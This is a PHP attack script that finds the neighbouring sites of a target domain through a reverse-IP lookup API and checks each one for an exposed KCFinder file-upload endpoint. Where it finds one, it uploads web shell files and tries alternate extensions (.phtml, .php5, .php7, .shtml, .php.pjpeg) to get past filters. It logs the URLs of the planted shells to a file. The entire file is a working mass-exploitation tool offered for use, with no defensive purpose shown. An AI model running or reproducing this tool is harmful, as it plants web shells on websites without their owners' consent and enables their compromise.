<?php

$green = "\033[0;32m";
$red = "\033[0;31m";
$blue = "\033[0;34m";
$white = "\033[1;37m";
@system(clear);
function banner() {
		$kcs = 
"_____  ____  ____  __
  / /_ / __/ /*__/\/ / @Auto reverse IP
 / v /C C  _/ __/ x c  @Auto upShell
/_/\_\ \_\_/___|/_/\_\ @KangKlepfound
   \n";
	return $kcs;
}
echo banner();



//phtml
function kcFinder($web) {
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $web);
    $cfile = new CURLFile('kcs.phtml','application/php','kcs.phtml');
    $data = array('Filedata' => $cfile);
    curl_setopt($ch, CURLOPT_POST,1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$ks = curl_exec($ch);
	curl_close($ch);
	return $ks;
}
//php5
function kcFinderr($web) {
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $web);
    $cfile = new CURLFile('kcs.php5','application/php','kcs.php5');
    $data = array('Filedata' => $cfile);
    curl_setopt($ch, CURLOPT_POST,1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$ks = curl_exec($ch);
	curl_close($ch);
	return $ks;
}
//php7
function kcFinderrr($web) {
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $web);
    $cfile = new CURLFile('kcs.php7','application/php','kcs.php7');
    $data = array('Filedata' => $cfile);
    curl_setopt($ch, CURLOPT_POST,1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$ks = curl_exec($ch);
	curl_close($ch);
	return $ks;
}
//shtml
function kcFinderrrr($web) {
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $web);
    $cfile = new CURLFile('kcs.shtml','application/php','kcs.shtml');
    $data = array('Filedata' => $cfile);
    curl_setopt($ch, CURLOPT_POST,1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$ks = curl_exec($ch);
	curl_close($ch);
	return $ks;
}
//html
function kcFinderrrrr($web) {
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $web);
    $cfile = new CURLFile('kcs.html','application/php','kcs.html');
    $data = array('Filedata' => $cfile);
    curl_setopt($ch, CURLOPT_POST,1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$ks = curl_exec($ch);
	curl_close($ch);
	return $ks;
}
//php.pjpeg
function kcFinderrrrrr($web) {
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $web);
    $cfile = new CURLFile('kcs.php.pjpeg','application/php','kcs.php.pjpeg');
    $data = array('Filedata' => $cfile);
    curl_setopt($ch, CURLOPT_POST,1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$ks = curl_exec($ch);
	curl_close($ch);
	return $ks;
}
function uError($web)
{
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $web);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
	curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');	
	$headers = array();
	$headers[] = 'Connection: keep-alive';
	$headers[] = 'Cache-Control: max-age=0';
	$headers[] = 'Dnt: 1';
	$headers[] = 'Upgrade-Insecure-Requests: 1';
	$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.75 Safari/537.36';
	$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3';
	$headers[] = 'Accept-Encoding: gzip, deflate';
	$headers[] = 'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7';
	curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
	$kce = curl_exec($ch);
	curl_close($ch);
	return $kce;	
}



$web = $argv[1];
$path = $argv[2];
$akses = $argv[3];

if(!$web) exit("{$red}[!] Usage php {$argv[0]} example.com asset/kcfinder/upload.php kcfinder/files \n");
// if(!file_exists($web)) exit("{$red}[!] File {$argv[1]} not found\n");
// $get = file_get_contents($list);
// $l = explode("\n", $get);
$api ="https://api.hackertarget.com/reverseiplookup/?q=".$web;
$rev = uError($api);
file_put_contents($web, $rev.PHP_EOL, FILE_APPEND);
$list = file_get_contents($web);
$le = explode("\n", $list);
$o = 0;
foreach ($le as $ler) {
	$o++;
	$unKnow = uError($ler."/$path");
	if (preg_match("/Unknown error/", $unKnow)) {
		$vu = $ler."/$path";
		file_put_contents("ok.txt", $vu.PHP_EOL, FILE_APPEND);
		echo "{$green}[+] $vu VULN\n";
		//upshell phtml
		$ups = kcFinder($vu);
		// echo "$ups";
		if (preg_match("/files/", $ups)) {
			# code get akses
			// echo "$ups\n";
			$ak = $ler."/{$akses}/kcs.phtml";
			file_put_contents("reshell.txt", $ak.PHP_EOL, FILE_APPEND);
			echo "Shell uploaded -> {$green}$ak\n";
		}elseif(preg_match("/Denied file extension/", $ups)){
			//php5
			$upss = kcFinderr($vu);
			if (preg_match("/files/", $upss)) {
				$ak = $ler."/{$akses}/kcs.php5";
				file_put_contents("reshell.txt", $ak.PHP_EOL, FILE_APPEND);
				echo "Shell uploaded -> {$green}$ak\n";
			}
			// echo "{$red}[-]Shell not uploaded\n";
		}elseif(preg_match("/Denied file extension/", $ups)) {
			//php7
			$upsss = kcFinderrr($vu);
			if (preg_match("/files/", $upsss)) {
				$ak = $ler."/{$akses}/kcs.php7";
				file_put_contents("reshell.txt", $ak.PHP_EOL, FILE_APPEND);
				echo "Shell uploaded -> {$green}$ak\n";
			}			
		}elseif(preg_match("/Denied file extension/", $ups)) {
			//shtml
			$upssss = kcFinderrrr($vu);
			if (preg_match("/files/", $upssss)) {
				$ak = $ler."/{$akses}/kcs.shtml";
				file_put_contents("reshell.txt", $ak.PHP_EOL, FILE_APPEND);
				echo "Shell uploaded -> {$green}$ak\n";
			}		
		}elseif(preg_match("/Denied file extension/", $ups)) {
			//html
			$upsssss = kcFinderrrrr($vu);
			if (preg_match("/files/", $upsssss)) {
				$ak = $ler."/{$akses}/kcs.html";
				file_put_contents("reshell.txt", $ak.PHP_EOL, FILE_APPEND);
				echo "Shell uploaded -> {$green}$ak\n";
			}		
		}elseif(preg_match("/Denied file extension/", $ups)) {
			//php.pjpeg
			$upssssss = kcFinderrrrrr($vu);
			if (preg_match("/files/", $upssssss)) {
				$ak = $ler."/{$akses}/kcs.php.pjpeg";
				file_put_contents("reshell.txt", $ak.PHP_EOL, FILE_APPEND);
				echo "Shell uploaded -> {$green}$ak\n";
			}		
		}
	}elseif (preg_match("/You don't have permissions to upload files/", $unKnow)) {
		echo "{$red}[-] raVuln({$white}$ler{$red})\n";
	}else{echo "{$red}[-] raVuln({$white}$ler{$red})\n";}


}
// foreach($l as $lst) {
// 	$vuln = uError($lst."/$path");
	
// 	if(preg_match("/Unknown error/", $vuln)) {
// 		$sa=$lst."/$path";
// 		file_put_contents("vuln.txt", $sa.PHP_EOL, FILE_APPEND);
// 		echo "{$green}[+] $sa VULN \n";
// 		//Try upshell
// 		$ks = kcFinder($sa);
// 		echo "$ks";
// 		if (preg_match("/files/", $ks)) {
// 			//Code get akses
// 			echo "Shell KEaplod\n";
// 		}
// 		elseif(preg_match("/Denied file extension./", $ks)){
// 			echo "Gagal aplod\n";
// 		}
	    
// 	} else {
// 		$sa=$lst."/$path";
// 		echo "{$red}[-] raVuln({$white}$sa{$red})\n";
// 	}
// }


?>
